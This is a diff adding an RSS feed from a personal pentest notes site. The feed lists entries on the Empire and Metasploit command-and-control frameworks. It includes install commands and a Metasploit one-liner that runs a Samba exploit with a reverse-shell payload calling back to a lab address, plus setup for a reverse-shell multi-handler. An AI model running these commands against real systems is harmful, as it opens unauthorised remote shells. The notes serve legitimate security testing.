@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>C2 Frameworks on My notes and snippets</title><link>https://dev-hugo.justin-p.me/tags/c2-frameworks/</link><description>Recent content in C2 Frameworks on My notes and snippets</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 11 Mar 2020 10:40:17 +0100</lastBuildDate><atom:link href="https://dev-hugo.justin-p.me/tags/c2-frameworks/index.xml" rel="self" type="application/rss+xml"/><item><title>Empire</title><link>https://dev-hugo.justin-p.me/tools/00-c2-frameworks/empire/</link><pubDate>Wed, 11 Mar 2020 10:40:17 +0100</pubDate><guid>https://dev-hugo.justin-p.me/tools/00-c2-frameworks/empire/</guid><description>Empire Install System git clone https://github.com/BC-SECURITY/Empire cd Empire sudo ./setup/install.sh Docker docker pull bcsecurity/empire:{version} docker run -it bcsecurity/empire:{version} # with persistent storage docker pull bcsecurity/empire:{version} docker create -v /empire --name data bcsecurity/empire:{version} docker run -it --volumes-from data bcsecurity/empire:{version} # if you prefer to be dropped into bash instead of directly into empire docker run -it --volumes-from data bcsecurity/empire:{version} /bin/bash Examples Reset DB /empire/setup/reset.sh setup basic listener and gen launcher (Empire) &amp;gt; listeners [!</description></item><item><title>'C2 Frameworks'</title><link>https://dev-hugo.justin-p.me/tools/00-c2-frameworks/</link><pubDate>Tue, 10 Mar 2020 16:33:38 +0100</pubDate><guid>https://dev-hugo.justin-p.me/tools/00-c2-frameworks/</guid><description>C2 Frameworks Empire
+Empire description.
+Metasploit
+Metasploit description.</description></item><item><title>Metasploit</title><link>https://dev-hugo.justin-p.me/tools/00-c2-frameworks/metasploit/</link><pubDate>Tue, 10 Mar 2020 16:33:38 +0100</pubDate><guid>https://dev-hugo.justin-p.me/tools/00-c2-frameworks/metasploit/</guid><description>Metasploit Install Usage msfconsole
+Examples init database msfdb init
+create new workspace workspace -a [name]
+switch to workspace workspace [name]
+run commands without interactive shell msfconsole -x &amp;quot;use exploit/multi/samba/usermap_script;\
+set RHOST 172.16.194.172;\
+set PAYLOAD cmd/unix/reverse;\
+set LHOST 172.16.194.163;\
+run&amp;quot;
+Multi-handler for reverse shell use exploit/multi/handler
+set LHOST 192.168.88.128
+set LPORT 4444
+set ExitOnSession False
+netcat/bash reverse set PAYLOAD linux/x86/shell/reverse_tcp
+run in the background run -j
+Also see Github Project metasploit-unleashed</description></item></channel></rss>
